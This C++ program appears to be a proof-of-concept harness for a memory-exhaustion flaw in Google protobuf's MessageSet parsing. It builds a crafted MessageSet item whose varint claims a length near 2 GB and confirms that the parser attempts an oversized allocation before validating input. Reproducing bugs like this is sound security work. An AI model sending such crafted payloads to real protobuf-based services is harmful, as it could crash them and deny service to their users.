#include <cstdint>
#include <cstdlib>
#include <exception>
#include <iomanip>
#include <iostream>
#include <new>
#include <sstream>
#include <string>
#include <sys/resource.h>

#include <google/protobuf/io/coded_stream.h>
#include <google/protobuf/wire_format_lite.h>

namespace {

constexpr uint32_t kClaimedLength = 0x7ffffff0u;
constexpr std::size_t kAllocationGuard = 512ull * 1024ull * 1024ull;
std::size_t g_last_allocation = 0;

std::string EncodeVarint(uint64_t value) {
  std::string out;
  while (value >= 0x80) {
    out.push_back(static_cast<char>((value & 0x7f) | 0x80));
    value >>= 7;
  }
  out.push_back(static_cast<char>(value));
  return out;
}

std::string BuildMaliciousMessageSetItem() {
  std::string payload;
  payload.push_back(static_cast<char>(
      google::protobuf::internal::WireFormatLite::kMessageSetItemStartTag));
  payload.push_back(static_cast<char>(
      google::protobuf::internal::WireFormatLite::kMessageSetMessageTag));
  payload += EncodeVarint(kClaimedLength);
  return payload;
}

std::string HexPreview(const std::string& bytes) {
  std::ostringstream oss;
  oss << std::hex << std::setfill('0');
  for (unsigned char c : bytes) {
    oss << std::setw(2) << static_cast<unsigned int>(c) << ' ';
  }
  return oss.str();
}

}  // namespace

struct NoOpMessageSetParser {
  bool ParseField(int, google::protobuf::io::CodedInputStream*) { return true; }
  bool SkipField(uint32_t, google::protobuf::io::CodedInputStream*) {
    return false;
  }
};

bool ApplyMemoryLimit() {
  constexpr rlim_t kLimitBytes = 512ull * 1024ull * 1024ull;
  const rlimit limit = {kLimitBytes, kLimitBytes};
  bool applied = false;
#ifdef RLIMIT_AS
  if (setrlimit(RLIMIT_AS, &limit) == 0) applied = true;
#endif
#ifdef RLIMIT_DATA
  if (setrlimit(RLIMIT_DATA, &limit) == 0) applied = true;
#endif
  return applied;
}

void* operator new(std::size_t size) {
  g_last_allocation = size;
  if (size > kAllocationGuard) {
    throw std::bad_alloc();
  }
  if (void* ptr = std::malloc(size)) return ptr;
  throw std::bad_alloc();
}

void* operator new[](std::size_t size) {
  return ::operator new(size);
}

void operator delete(void* ptr) noexcept { std::free(ptr); }
void operator delete[](void* ptr) noexcept { std::free(ptr); }
void operator delete(void* ptr, std::size_t) noexcept { std::free(ptr); }
void operator delete[](void* ptr, std::size_t) noexcept { std::free(ptr); }

int main() {
  std::cerr << "Applied memory limit=" << ApplyMemoryLimit() << "\n";
  const std::string wire = BuildMaliciousMessageSetItem();

  std::cerr << "Using inline ParseMessageSetItemImpl from staged protobuf headers\n";
  std::cerr << "Wire size=" << wire.size() << " bytes\n";
  std::cerr << "Claimed message bytes=" << kClaimedLength << "\n";
  std::cerr << "Varint size="
            << google::protobuf::io::CodedOutputStream::VarintSize32(
                   kClaimedLength)
            << "\n";
  std::cerr << "Computed resize argument="
            << static_cast<uint32_t>(
                   kClaimedLength +
                   google::protobuf::io::CodedOutputStream::VarintSize32(
                       kClaimedLength))
            << "\n";
  std::cerr << "Wire hex=" << HexPreview(wire) << "\n";

  google::protobuf::io::CodedInputStream input(
      reinterpret_cast<const uint8_t*>(wire.data()),
      static_cast<int>(wire.size()));
  const uint32_t start_tag = input.ReadTag();
  std::cerr << "Initial tag=" << start_tag << "\n";
  std::cerr << "CurrentPosition after start tag=" << input.CurrentPosition()
            << "\n";
  std::cerr << "BytesUntilLimit before parse=" << input.BytesUntilLimit()
            << "\n";
  std::cerr << "BytesUntilTotalBytesLimit before parse="
            << input.BytesUntilTotalBytesLimit() << "\n";
  if (start_tag != google::protobuf::internal::WireFormatLite::
                       kMessageSetItemStartTag) {
    std::cerr << "Failed to enter MessageSet item parsing path\n";
    return 2;
  }

  try {
    std::cerr << "[marker] before ParseMessageSetItemImpl" << std::endl;
    const bool ok = google::protobuf::internal::ParseMessageSetItemImpl(
        &input, NoOpMessageSetParser{});
    std::cerr << "ParseMessageSetItemImpl returned " << ok << "\n";
    std::cerr << "Largest attempted allocation=" << g_last_allocation << "\n";
    std::cerr << "BytesUntilLimit after parse=" << input.BytesUntilLimit()
              << "\n";
    return ok ? 0 : 1;
  } catch (const std::bad_alloc& ex) {
    std::cerr << "Caught std::bad_alloc while parsing: " << ex.what() << "\n";
    std::cerr << "Largest attempted allocation=" << g_last_allocation << "\n";
    std::cerr << "Confirmed oversized allocation attempt before input availability validation\n";
    return 0;
  } catch (const std::length_error& ex) {
    std::cerr << "Caught std::length_error while parsing: " << ex.what() << "\n";
    std::cerr << "Largest attempted allocation=" << g_last_allocation << "\n";
    std::cerr << "Confirmed oversized allocation attempt before input availability validation\n";
    return 0;
  } catch (const std::exception& ex) {
    std::cerr << "Caught other std::exception: " << ex.what() << "\n";
    return 4;
  }
}
